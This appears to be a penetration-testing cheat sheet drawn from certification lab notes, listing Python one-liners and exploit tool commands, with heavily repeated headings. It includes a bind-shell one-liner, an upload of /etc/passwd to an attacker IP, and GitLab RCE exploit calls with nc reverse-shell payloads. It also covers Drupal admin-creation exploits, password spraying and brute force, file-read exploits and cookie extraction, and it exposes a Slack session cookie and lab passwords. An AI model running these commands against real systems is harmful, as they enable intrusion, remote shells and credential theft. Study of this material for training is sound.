# Python one-liners / servers

% python, http-server, file-transfer, cpts

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - a-faire-sur-la-cible
#cat/ATTACK/LISTEN-SERVE #cpts
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - default-creds
#cat/ATTACK/LISTEN-SERVE #cpts
[Router creds](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

```
pip3 install defaultcreds-cheat-sheet
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - openvas
#cat/ATTACK/LISTEN-SERVE #cpts
[openvasreporting](https://github.com/TheGroundZero/openvasreporting)

```
python3 -m openvasreporting -i report-2bf466b5-627d-4659-bea6-1758b43235b1.xml -f xlsx
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - ftp-downloads
#cat/ATTACK/LISTEN-SERVE #cpts
```
sudo pip3 install pyftpdlib
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - powershell-web-upload
#cat/ATTACK/LISTEN-SERVE #cpts
```
pip3 install uploadserver
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - powershell-web-upload-2
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 -m uploadserver
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - smb-upload
#cat/ATTACK/LISTEN-SERVE #cpts
When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.

```
sudo pip3 install wsgidav cheroot
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - smb-upload-2
#cat/ATTACK/LISTEN-SERVE #cpts
When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP.

```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - web-upload
#cat/ATTACK/LISTEN-SERVE #cpts
```
sudo python3 -m pip install --user uploadserver
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - web-upload-3
#cat/ATTACK/LISTEN-SERVE #cpts
```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - misc
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 -m http.server
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - misc-2
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 -m SimpleHTTPServer
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - python2
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - python3
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - upload
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - server---binding-a-bash-shell-to-the-tcp-session
#cat/ATTACK/LISTEN-SERVE #cpts
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - cloud-enumeration
#cat/ATTACK/LISTEN-SERVE #cpts
As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as a

```
python3 o365spray.py --validate --domain msplaintext.xyz
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - cloud-enumeration-2
#cat/ATTACK/LISTEN-SERVE #cpts
Now, we can attempt to identify usernames.

```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - passwords-attack
#cat/ATTACK/LISTEN-SERVE #cpts
If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked. We can instead try to use custom tools such as [o

```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - extract-keytab-hash
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - pass-the-certificate
#cat/ATTACK/LISTEN-SERVE #cpts
*Note: The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certip

```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - pass-the-certificate-2
#cat/ATTACK/LISTEN-SERVE #cpts
We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01\$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the re

```
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - pass-the-certificate-3
#cat/ATTACK/LISTEN-SERVE #cpts
We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01\$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the re

```
python3 -m venv .venv
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - pass-the-certificate-4
#cat/ATTACK/LISTEN-SERVE #cpts
We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01\$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the re

```
pip3 install -r requirements.txt
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - pass-the-certificate-5
#cat/ATTACK/LISTEN-SERVE #cpts
Then, we can begin the attack. *Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.*

```
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - running-serverpy-from-the-attack-host
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - running-clientpy-from-pivot-target
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - connecting-to-a-web-server-using-http-proxy-ntlm-auth
#cat/ATTACK/LISTEN-SERVE #cpts
```
python client.py --server-ip <ip> --server-port 8080 --ntlm-proxy-ip <ip> --ntlm-proxy-port 8081 --domain <domain> --username <user> --password <password>
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - extracting-the-kerberos-ticket-using-kirbi2johnpy
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 kirbi2john.py sqldev.kirbi
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - installing-a-configured-webserver-with-upload
#cat/ATTACK/LISTEN-SERVE #cpts
Windows File Transfer Methods

```
File upload available at /upload
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - cracking-the-pin
#cat/ATTACK/LISTEN-SERVE #cpts
The Python script systematically iterates all possible 4-digit PINs (0000 to 9999) and sends GET requests to the Flask endpoint with each PIN. It checks the response status code and content to identify the correct PIN an

```
python pin-solver.py
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - throwing-a-dictionary-at-the-problem
#cat/ATTACK/LISTEN-SERVE #cpts
The Python script orchestrates the dictionary attack. It performs the following steps: 1. `Downloads the Wordlist`: First, the script fetches a wordlist of 500 commonly used (and therefore weak) passwords from SecLists u

```
python3 dictionary-solver.py
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - automated-discovery
#cat/ATTACK/LISTEN-SERVE #cpts
Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for d

```
git clone https://github.com/s0md3v/XSStrike.git
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - automated-discovery-2
#cat/ATTACK/LISTEN-SERVE #cpts
Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for d

```
cd XSStrike
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - automated-discovery-3
#cat/ATTACK/LISTEN-SERVE #cpts
Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for d

```
pip install -r requirements.txt
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - automated-discovery-4
#cat/ATTACK/LISTEN-SERVE #cpts
Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for d

```
python xsstrike.py
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - automated-discovery-5
#cat/ATTACK/LISTEN-SERVE #cpts
We can then run the script and provide it a URL with a parameter using `-u`. Let's try using it with our `Reflected XSS` example from the earlier section:

```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - linux-bashfuscator
#cat/ATTACK/LISTEN-SERVE #cpts
A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```
git clone https://github.com/Bashfuscator/Bashfuscator
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - linux-bashfuscator-2
#cat/ATTACK/LISTEN-SERVE #cpts
A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```
cd Bashfuscator
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - linux-bashfuscator-3
#cat/ATTACK/LISTEN-SERVE #cpts
A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```
pip3 install setuptools==65
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - linux-bashfuscator-4
#cat/ATTACK/LISTEN-SERVE #cpts
A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```
python3 setup.py install --user
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - vulnerable-plugins---wpdiscuz
#cat/ATTACK/LISTEN-SERVE #cpts
[wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over [1.6 million downloads](https://wordpress.org/plugins/wpdiscuz/advanced/) and ove

```
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - enumeration
#cat/ATTACK/LISTEN-SERVE #cpts
Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle. We can clone the Git repo and

```
sudo pip3 install droopescan
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - alternative-installation-of-python27
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 -m pip install urllib3
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - alternative-installation-of-python27-2
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 -m pip install certifi
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - alternative-installation-of-python27-3
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2.7 -m pip install bs4
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - alternative-installation-of-python27-4
#cat/ATTACK/LISTEN-SERVE #cpts
While a bit out of date, it can be helpful in our enumeration. Let's run a scan.

```
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - leveraging-known-vulnerabilities
#cat/ATTACK/LISTEN-SERVE #cpts
At the time of writing, there have been [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Joomla-related vulnerabilities that received CVEs. However, just because a vulnerability was disclos

```
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - drupalgeddon
#cat/ATTACK/LISTEN-SERVE #cpts
As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https:/

```
python2.7 drupalgeddon.py
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - drupalgeddon-2
#cat/ATTACK/LISTEN-SERVE #cpts
As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https:/

```
(CVE-2014-3704)
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - drupalgeddon-3
#cat/ATTACK/LISTEN-SERVE #cpts
As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https:/

```
Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - drupalgeddon-4
#cat/ATTACK/LISTEN-SERVE #cpts
As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https:/

```
t TARGET, --target=TARGET
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - drupalgeddon-5
#cat/ATTACK/LISTEN-SERVE #cpts
Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user.

```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - drupalgeddon2
#cat/ATTACK/LISTEN-SERVE #cpts
We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.

```
python3 drupalgeddon2.py
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - tomcat-manager---login-brute-force
#cat/ATTACK/LISTEN-SERVE #cpts
This is a very straightforward script that takes a few arguments. We can run the script with `-h` to see what it requires to run.

```
python3 mgr_brute.py -h
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - tomcat-manager---login-brute-force-2
#cat/ATTACK/LISTEN-SERVE #cpts
This is a very straightforward script that takes a few arguments. We can run the script with `-h` to see what it requires to run.

```
U URL, --url URL URL to tomcat page
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - tomcat-manager---login-brute-force-3
#cat/ATTACK/LISTEN-SERVE #cpts
We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses. We run it and get a hit!

```
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - cve-2020-1938-ghostcat
#cat/ATTACK/LISTEN-SERVE #cpts
The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Download the script and save it locally. The ex

```
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - cve-2020-1938-ghostcat-2
#cat/ATTACK/LISTEN-SERVE #cpts
The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Download the script and save it locally. The ex

```
(the "License"); you may not use this file except in compliance with
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - authenticated-remote-code-execution
#cat/ATTACK/LISTEN-SERVE #cpts
Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privile

```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.15 8443 >/tmp/f '
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - coldfusion---exploitation
#cat/ATTACK/LISTEN-SERVE #cpts
```
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - use-what-youve-learned-from-this-section-to-generate-a-report-with-eye
#cat/ATTACK/LISTEN-SERVE #cpts
Using the "webDiscovery.xml" file that `Nmap` generated, students need to feed it into `EyeWitness`:

```
python3 EyeWitness.py --web -x ~/web_discovery.xml -d inlanefreight_eyewitness
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - find-the-password-for-the-admin-user-on-httpappinlanefreightlocal
#cat/ATTACK/LISTEN-SERVE #cpts
Then, students need to bruteforce the password of the user `admin` using `joomla-brute.py`:

```
python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/rockyou.txt -usr admin
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - gain-remote-code-execution-on-the-gitlab-instance-submit-the-flag-in-t
#cat/ATTACK/LISTEN-SERVE #cpts
From the previous section, students should have already created a `GitLab` user (with the credentials `HTBAcademy:password123` in here), therefore, they need to utilize it to attain a reverse-shell with the exploit:

```
python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc PWNIP PWNPO >/tmp/f'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - what-user-is-coldfusion-running-as
#cat/ATTACK/LISTEN-SERVE #cpts
Then, students need to modify the connection information in the script, adjusting for `STMIP` and `PWNIP`: At last, students need to run the script to achieve remote code execution:

```
python3 50057.py
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t
#cat/ATTACK/LISTEN-SERVE #cpts
Then, students need to run and background the exploit to attain a reverse shell:

```
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' STMIP STMPO &
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - submit-the-contents-of-flag5txt
#cat/ATTACK/LISTEN-SERVE #cpts
However, before that, students first need to attain a PTY instead of the current dumb terminal. Afterward, students can exploit the misconfiguration to become `root`:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - submit-the-contents-of-flag5txt-2
#cat/ATTACK/LISTEN-SERVE #cpts
However, before that, students first need to attain a PTY instead of the current dumb terminal. Afterward, students can exploit the misconfiguration to become `root`:

```
sudo busctl --show-machine
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - starting-local-http-server
#cat/ATTACK/LISTEN-SERVE #cpts
Next, start a Python HTTP server.

```
python3 -m http.server 7777
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - starting-a-python-web-server
#cat/ATTACK/LISTEN-SERVE #cpts
Next, start a Python web server in the same directory where our `shell.ps1` script resides.

```
python3 -m http.server 8080
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - extracting-keepass-hash
#cat/ATTACK/LISTEN-SERVE #cpts
First, we extract the hash in Hashcat format using the `keepass2john.py` script.

```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - decrypt-the-password-with-mremoteng_decrypt
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - attempt-to-decrypt-the-password-with-a-custom-password
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - attempt-to-decrypt-the-password-with-a-custom-password-2
#cat/ATTACK/LISTEN-SERVE #cpts
```
File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - attempt-to-decrypt-the-password-with-a-custom-password-3
#cat/ATTACK/LISTEN-SERVE #cpts
```
File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - attempt-to-decrypt-the-password-with-a-custom-password-4
#cat/ATTACK/LISTEN-SERVE #cpts
```
File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - attempt-to-decrypt-the-password-with-a-custom-password-5
#cat/ATTACK/LISTEN-SERVE #cpts
```
File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - decrypt-the-password-with-mremoteng_decrypt-and-a-custom-password
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - extract-slack-cookie-from-firefox-cookies-database
#cat/ATTACK/LISTEN-SERVE #cpts
```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - extract-slack-cookie-from-firefox-cookies-database-2
#cat/ATTACK/LISTEN-SERVE #cpts
```
(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - updating-the-local-microsoft-vulnerability-database
#cat/ATTACK/LISTEN-SERVE #cpts
We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file.

```
python2.7 windows-exploit-suggester.py --update
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - running-windows-exploit-suggester
#cat/ATTACK/LISTEN-SERVE #cpts
Once this is done, we can run the tool against the vulnerability database to check for potential privilege escalation flaws.

```
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - report-init
#cat/ATTACK/LISTEN-SERVE #cpts
```
python main.py export $_ --gitlab-issue https://sec-git.lan.intrinsec.com/pmo/gestion_projets/-/issues/\$issue --gitlab-token $token_git --lot 1 --msgraph-token \$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - fluffy
#cat/ATTACK/LISTEN-SERVE #cpts
extrait du PDF Joplin: fluffy

```
python3 poc.py Enter your file name: kavi Enter IP (EX: 192.168.1.162): 10.10.14.74 completed smb: \> put exploit.zip putting file exploit.zip as \exploit.zip (0.7 kb/s) (average 0.7 kb/s) smb: \> ls exploit.zip A 317 Mon May 19 15:34:02 2025
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - redelegate
#cat/ATTACK/LISTEN-SERVE #cpts
extrait du PDF Joplin: redelegate

```
python3 dnstool.py -u 'REDELEGATE.VL\marie.curie' -p 'Fall2024!' -r 'test' -a add -d "10.10.14.67" 10.129.234.50
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - metatwo
#cat/ATTACK/LISTEN-SERVE #cpts
extrait du PDF Joplin: metatwo

```
